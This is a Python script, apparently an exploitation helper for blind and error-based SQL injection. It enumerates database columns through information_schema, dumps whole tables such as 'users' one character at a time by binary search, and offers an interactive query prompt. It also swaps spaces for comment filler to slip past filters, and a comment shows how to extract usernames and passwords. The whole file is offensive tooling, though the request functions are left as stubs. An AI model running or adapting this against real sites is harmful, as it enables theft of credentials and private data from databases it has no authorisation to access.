from __future__ import print_function

import re, os, sys

def get_cols(table, template, fn, get_str):
    query = '(select COUNT(column_name) from information_schema.columns where table_name="%s")' % (table)
    v = get_str(template, query, fn)
    columns = []
    for i in range(int(v)):
        query = '(select column_name from information_schema.columns where table_name="%s" limit %d, 1)' % (table, i)
        c = get_str(template, query, fn)
        columns.append(c)
    return columns

def dump_table(table, template, fn, get_str):
    columns = get_cols(table, template, fn, get_str)
    print(columns)
    query = "(select COUNT(*) from %s)" % table
    n = get_str(template, query, fn)
    records = []
    for i in range(int(n)):
        cols_ = ','.join(map(lambda x: x, columns))
        query = "(select concat_ws('|', %s) from %s limit %d, 1)" % (cols_, table, i)
        try:
            s = get_str(template, query, fn)
            print(s)
            records.append(s.split('|'))
        except Exception as e:
            pass
    return records

def binary_search(fn, template, v1, maxLength=None):
    _sum, i = 0, 1
    if maxLength is not None:
        assert maxLength > 0, "Invalid Maximum Length ({0})".format(maxLength)
    while True:
        if maxLength is None and fn(template % (v1, i, '""')):
            break
        elif i-1 == maxLength:
            break
        _sum *= 2
        if fn(template % (v1, i, '1')):
            _sum += 1
        i += 1
    return _sum


# blind get character
def get_string(template, val, func):
    # val: 'version()'
    # get length
    ltemp = 'mid(bin(length(%s)), %d, 1) = %s'
    length = binary_search(func, template % ltemp, val)
    print('length: %d' % length)

    wtemp = 'mid(lpad(bin(ascii(mid(%s, {0}, 1))), 8, "0"), %d, 1) = %s'
    print('\r' + '_' * length, end='')
    output = ''
    for j in range(length):
        _ascii = binary_search(func, template % wtemp.format(j+1), val, 8)
        output += chr(_ascii)
        print('\r' + output + '_' * (length-j-1), end='')
        sys.stdout.flush()
    print()
    return output

# error-based sqli
# subq example: select concat_ws(',', username, password) from users limit 1 offset 0
def get_string_by_error(template, subq, getVal):
    anchor = 'ggag'
    subq = "concat('{0}',{1},'{0}')".format(anchor, subq)
    ssql = template % subq
    v = getVal(ssql)
    mobj = re.match('{0}(.*){0}'.format(anchor), v)
    return mobj.group(1)


if __name__ == '__main__':

    # ==== example ====
    url = 'http://<vuln-ip>'

    # boolean based SQLi
    def boolean(sql):
        from lxml import html
        import requests

        # post processing here
        sql = sql.replace(' ', '/**/')

        # logic here
        return False

    # error based SQLi
    def extractInfo(sql):
        import requests

        # post processing here
        sql = sql.replace(' ', '/**/')

        # logic here
        return ""
    # ================

    # find all users
    temp = "(case when %s then xxx else yyy end)-- -"
    temp_error = "(case when cast ((%s) as numeric)=1 then xxx else yyy end)-- -"
    rows = dump_table('users', temp_error, extractInfo, get_string_by_error)
    for r in rows:
        print(r)

    while True:
        query = raw_input("> ").strip()
        try:
            s = get_string(temp, query, boolean)  # boolean-based
            #s = get_string_by_error(temp_error, query) # error-based
            print(s)
        except AssertionError as e:
            print(e)
